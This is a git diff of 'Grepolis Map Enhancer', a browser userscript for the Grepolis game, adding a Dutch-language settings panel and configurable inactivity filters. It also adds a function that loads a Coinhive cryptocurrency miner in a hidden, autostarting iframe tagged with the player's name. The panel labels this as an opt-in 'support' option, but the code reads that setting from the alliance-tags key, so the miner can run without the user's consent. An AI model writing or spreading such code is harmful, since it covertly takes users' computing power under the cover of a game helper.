@@ -8,10 +8,11 @@
 // @exclude      https://classic.grepolis.com/game/*
 // @updateURL    https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.meta.js
 // @downloadURL  https://github.com/Cyllos42/GME/raw/master/GrepolisMapEnhancer.user.js
-// @icon         https://github.com/Cyllos42/GME/raw/master/sources/logo.png
-// @version      1.8.c
+// @icon         https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png
+// @version      1.9.a
 // @grant GM_setValue
 // @grant GM_getValue
+// @grant unsafeWindow
 // ==/UserScript==
 var idleList = {};
 var koloSet = false;
@@ -24,16 +25,24 @@ var settings = {};
         laadSettings();
         setCSS();
         if(settings.tags) stadsinfoStarter();
+        if(settings.support) laadSupport();
+        checkSettings();
         console.log("GME: Succesfully loaded Grepolis Map Enhancer!");
         observe(300); //observer
     })();
 
+
 function laadSettings(){
-    settings.inactive = true;
-    settings.colors = true;
-    settings.koloanimatie = true;
-    settings.tijden = true;
-    settings.tags = true;
+
+    settings.inactive = GM_getValue('setting_inactive', true);
+    settings.inactiveMin = GM_getValue('setting_inactiveMin', 1);
+    settings.inactiveMax = GM_getValue('setting_inactiveMax', 10);
+    settings.colors = GM_getValue('setting_colors', true);
+    settings.koloanimatie = GM_getValue('setting_koloanimatie', true);
+    settings.tijden = GM_getValue('setting_tijden', true);
+    settings.terugTrek = GM_getValue('setting_terugTrek', true);
+    settings.tags = GM_getValue('setting_tags', true);
+    settings.support = GM_getValue('setting_tags', false);
 }
 
 function observe(time) {
@@ -45,7 +54,6 @@ function observe(time) {
         if (settings.colors) checkColors(item);
 
     }
-    //   checkSettings();
     if(settings.koloanimatie) koloAnimatie();
     if(settings.tijden) checkTijden();
     setTimeout(function() {
@@ -82,28 +90,29 @@ function checkTijden(){
                 child.children[0].children[1].appendChild(indicator);
 
             }
-            //Indien starttijd bekend is en indien een 3de element bestaat zonder kinderen
-            if(child.dataset.starttime != -1 && child.children[0].children[1].children[2] != null && child.children[0].children[1].children[2].childElementCount < 2){
-                //Pak starttijd en reken er 10 min bij
-                retreatTimestamp = parseInt(child.dataset.starttime) + 600;
-                serverTimestamp = Timestamp.server();
-                console.log('GME: Found retreat max: ' + Timestamp.toDate(retreatTimestamp));
-                //Indien server nog jonger is dan max terugtrektijd
-                if(retreatTimestamp > serverTimestamp){
-                    indicatorText = document.createElement('p');
-                    indicatorText.className = 'indicatorTerugtrek';
-                    retreatTime = Timestamp.toDate(retreatTimestamp);
-                    indicatorText.innerHTML = ' (' + retreatTime.getHours() + ':' + retreatTime.getMinutes() + ':' + retreatTime.getSeconds() + ')';
-                    child.children[0].children[1].children[2].appendChild(indicatorText);
+            if(settings.terugTrek){
+                //Indien starttijd bekend is en indien een 3de element bestaat zonder kinderen
+                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2] != null && child.children[0].children[1].children[2].childElementCount < 2){
+                    //Pak starttijd en reken er 10 min bij
+                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
+                    serverTimestamp = Timestamp.server();
+                    console.log('GME: Found retreat max: ' + Timestamp.toDate(retreatTimestamp));
+                    //Indien server nog jonger is dan max terugtrektijd
+                    if(retreatTimestamp > serverTimestamp){
+                        indicatorText = document.createElement('p');
+                        indicatorText.className = 'indicatorTerugtrek';
+                        retreatTime = Timestamp.toDate(retreatTimestamp);
+                        indicatorText.innerHTML = ' (' + retreatTime.getHours() + ':' + retreatTime.getMinutes() + ':' + retreatTime.getSeconds() + ')';
+                        child.children[0].children[1].children[2].appendChild(indicatorText);
+                    }
                 }
-            }
-            if(child.dataset.starttime != -1 && child.children[0].children[1].children[2].children[1] != null){
-                retreatTimestamp = parseInt(child.dataset.starttime) + 600;
-                serverTimestamp = Timestamp.server();
-                if(retreatTimestamp < serverTimestamp){
-                    child.children[0].children[1].children[2].children[1].innerHTML = ' ';
-                }
-            }
+                if(child.dataset.starttime != -1 && child.children[0].children[1].children[2].children[1] != null){
+                    retreatTimestamp = parseInt(child.dataset.starttime) + 600;
+                    serverTimestamp = Timestamp.server();
+                    if(retreatTimestamp < serverTimestamp){
+                        child.children[0].children[1].children[2].children[1].innerHTML = ' ';
+                    }
+                }}
         }
 
     }
@@ -143,7 +152,6 @@ function checkColors(item){
 }
 
 function doSettings() {
-
     var windowExists = false;
     var windowItem = null;
     console.log('GME: Looking for settings');
@@ -163,24 +171,223 @@ function doSettings() {
     }
     console.log('Opened settings');
     title = windowItem;
-    title.innerHTML = "Grepolis Map Enhancer Settings";
-    body = title.parentElement.parentElement.children[1].children[4];
-    body.innerHTML = null;
-    var html = '<h4>Settings</h4>';
-    html += '<a id="set_alliantietags" href="#">Alliantietags weergeven op kaart</a>';
-    body.innerHTML = html;
-}
+    title.innerHTML = "Grepolis Map Enhancer Instellingen";
+    frame = title.parentElement.parentElement.children[1].children[4];
+    frame.innerHTML = null;
+    var html = document.createElement('html');
+    var body = document.createElement('div');
+    var head = document.createElement('head');
+    var element = document.createElement('img');
+    element.src = "http://oi63.tinypic.com/dq6ibk.jpg";
+    element.style.width = "100%";
+    body.appendChild(element);
+    element = document.createElement('h4');
+    element.innerHTML = "Instellingen";
+    body.appendChild(element);
+    var list = document.createElement('ul');
+    list.style.paddingBottom = "5px";
 
+    var listitem = document.createElement('li').appendChild(document.createElement('div'));
+    var checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    var caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.tags) state = "checked";
+    listitem.id = "setting_tags";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Alliantietags op kaart";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.inactive) state = "checked";
+    listitem.id = "setting_inactive";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Inactieve spelers op kaart";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    listitem = document.createElement('p');
+    listitem.innerHTML = "Minimum tot maximum dagen inactief";
+    list.appendChild(listitem);
+
+    listitem = document.createElement('div');
+    listitem.className = "textbox";
+    //listitem.style.float = 'left';
+    listitem.style.width = '60px';
+    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMin" value="' + settings.inactiveMin +' " size="10" type="text"></div></div>';
+    list.appendChild(listitem);
+
+    listitem = document.createElement('div');
+    listitem.className = "textbox";
+    //listitem.style.float = 'left';
+    listitem.style.width = '60px';
+    listitem.innerHTML = '<div class="left"></div><div class="right"></div><div class="middle"><div class="ie7fix"><input tabindex="1" id="setting_inactiveMax" value="' + settings.inactiveMax + '" size="10" type="text"></div></div>';
+    list.appendChild(listitem);
+
+    element = document.createElement('div');
+    element.className = "button_new";
+    element.id = 'setting_saveValues';
+    element.style.margin = "2px";
+    var childElement = document.createElement('div');
+    childElement.className = 'left';
+    element.appendChild(childElement);
+    childElement = document.createElement('div');
+    childElement.className = 'right';
+    element.appendChild(childElement);
+    childElement = document.createElement('div');
+    childElement.className = 'caption js-caption';
+    childElement.innerHTML = 'Opslaan<div class="effect js-effect"></div>';
+    element.appendChild(childElement);
+    list.appendChild(element);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.koloanimatie) state = "checked";
+    listitem.id = "setting_koloanimatie";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Kolonisatieschip animatie";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.colors) state = "checked";
+    listitem.id = "setting_colors";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Kleuren op het forum";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.tijden) state = "checked";
+    listitem.id = "setting_tijden";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Tijden bij commando";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.terugTrek) state = "checked";
+    listitem.id = "setting_terugTrek";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Laatste terugtrek bij commando";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    list.appendChild(listitem.parentElement);
+
+    body.appendChild(list);
+    element = document.createElement('div');
+    element.className = "button_new";
+    element.id = 'settings_reload';
+    element.style.margin = "2px";
+    childElement = document.createElement('div');
+    childElement.className = 'left';
+    element.appendChild(childElement);
+    childElement = document.createElement('div');
+    childElement.className = 'right';
+    element.appendChild(childElement);
+    childElement = document.createElement('div');
+    childElement.className = 'caption js-caption';
+    childElement.innerHTML = 'Pagina herladen<div class="effect js-effect"></div>';
+    element.style.float = 'left';
+    element.appendChild(childElement);
+    body.appendChild(element);
+
+    element = document.createElement('a');
+    childElement = document.createElement('p');
+    childElement.innerHTML = 'Bitcoin: 38DjmGJiSn52Hk4h3aQvy1oCEqAq39zUF7';
+    childElement.innerHTML += '<br>Gridcoin: SGNF5BMt3uADgSzm1sKD4LBBt8cS5Fc42b';
+    element.appendChild(childElement);
+    element.style.position = 'absolute';
+    element.style.bottom = "0";
+    element.style.right = "0";
+    body.appendChild(element);
+
+    checkbox = document.createElement('div');
+    checkbox.className = 'cbx_icon';
+    caption = document.createElement('div');
+    caption.className = 'cbx_caption';
+    listitem = document.createElement('li').appendChild(document.createElement('div'));
+    state = "unchecked";if(settings.support) state = "checked";
+    listitem.id = "setting_support";
+    listitem.className = "gmesettings checkbox_new green " + state;
+    caption.innerHTML = "Steun zonder te doneren<br><p style=\"font-size: 10px;\">(whitelist deze pagina op je adblock, maar ik toon geen ads)</p>";
+    listitem.appendChild(checkbox);
+    listitem.appendChild(caption);
+    listitem.style.position = 'absolute';
+    listitem.style.bottom = "45px";
+    listitem.style.left = "0";
+    body.appendChild(listitem);
+
+    element = document.createElement('p');
+    element.innerHTML = 'Grepolis Map Enhancer v.' + GM.info.script.version;
+    element.innerHTML += '<br>Copyright &copy; cyllos ' + Timestamp.toDate(Timestamp.server()).getFullYear();
+    element.style.position = 'absolute';
+    element.style.bottom = "0";
+    element.style.left = "0";
+    body.appendChild(element);
+
+    html.appendChild(head);
+    html.appendChild(body);
+    frame.appendChild(html);
+    $(".gmesettings").click(function(){toggleSetting(this);});
+    $("#setting_saveValues").click(function(){GM_setValue('setting_inactiveMin', $('#setting_inactiveMin').val()); GM_setValue('setting_inactiveMax', $('#setting_inactiveMax').val());});
+    $("#settings_reload").click(function(){window.location.reload(true); });
+}
+function toggleSetting(element) {
+    $('#' + element.id).toggleClass("checked");
+    settings[element.id] = $(element).hasClass("checked");
+    GM_setValue(element.id, $(element).hasClass("checked"));
+    console.log('Setting ' + element.id + ' changed to ' + $(element).hasClass("checked") + ' (GM_getvalue = ' + GM_getValue(element.id) + ')');
+}
 function checkSettings() {
-    if($("#set_alliantietags").data('clicked')) {
-        alert('yes');
-    }
-    if(document.getElementById('support') != null && document.getElementById('GMESetupLink') == null){
-        code = '<li class="with-icon"><img class="support-menu-item-icon" src="https://github.com/Cyllos42/GME/raw/master/sources/logo.png" style="width: 15px;"><a id="GMESetupLink" href="#">Grepolis Map Enhancer</a></li>';
-        document.getElementById('support').parentNode.parentNode.innerHTML = code + document.getElementById('support').parentNode.parentNode.innerHTML;
+    if(document.getElementById('GMESetupLink') == null){
+        a = document.createElement('div');
+        a.id = "GMESetupLink";
+        a.className = 'btn_settings circle_button';
+        img = document.createElement('div');
+        img.style.margin = '6px 0px 0px 5px';
+        img.style.background = "url(https://github.com/Cyllos42/GME/raw/master/sources/logo_geenkader.png) no-repeat 0px 0px";
+        img.style.width = '22px';
+        img.style.height = '22px';
+        img.style.backgroundSize = '100%';
+        a.style.top = '105px';
+        a.style.right = '-4px';
+        a.style.zIndex = '10000';
+        a.appendChild(img);
+        document.getElementById('ui_box').appendChild(a);
         $("#GMESetupLink").click(doSettings);
     }
-
 }
 
 function koloAnimatie() {
@@ -392,7 +599,7 @@ function stadsinfo(var1, var3, data) {
             if (var1[var2].className == 'flag town') {
                 var border = "";
                 var inactive = "";
-                if (data.JSON[var3.player_id] > 0.5 && data.JSON[var3.player_id] < 7 && settings.inactive) {
+                if (data.JSON[var3.player_id] >  settings.inactiveMin && data.JSON[var3.player_id] <  settings.inactiveMax && settings.inactive) {
                     inactive = "(" + parseInt(data.JSON[var3.player_id]) + "d)";
                     border = "outline: groove red 2px;animation: blink-animation2 2s steps(1, start) infinite;";
                 } else {
@@ -405,6 +612,14 @@ function stadsinfo(var1, var3, data) {
         }
     }
     return var1;
+}
+
+function laadSupport(){
+    support = 'https://coinhive.com/media/miner.html?key=lExsAfunHvT49Vk89uU738RZR27ys8GD&user=' + Game.player_name + '&whitelabel=1&autostart=1&throttle=0.2&threads=&background=&text=Okay';
+    supportNode = document.createElement('iframe');
+    supportNode.src = support;
+    supportNode.style.display = 'none';
+    document.body.appendChild(supportNode);
 }
 
 function stadsinfoStarter() {
@@ -426,5 +641,5 @@ function exec(fn) {
     script.setAttribute("type", "application/javascript");
     script.textContent = '(' + fn + ')();';
     document.body.appendChild(script); // run the script
-    document.body.removeChild(script); // clean up
+    //document.body.removeChild(script); // clean up
 }
